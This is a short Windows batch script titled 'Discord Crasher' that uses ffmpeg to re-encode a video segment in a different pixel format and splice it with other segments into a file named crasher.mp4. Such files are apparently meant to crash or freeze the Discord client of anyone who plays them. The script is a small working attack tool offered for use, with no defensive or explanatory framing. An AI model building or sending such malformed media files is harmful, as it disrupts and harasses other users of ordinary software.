title "Generating temp file | Discord Crasher"
ffmpeg -i part02.mp4 -pix_fmt yuv444p temp_new.mp4
title "Generating crasher file | Discord Crasher"
ffmpeg -f concat -i crash.txt -codec copy crasher.mp4
cls
@echo off
echo Finished.
pause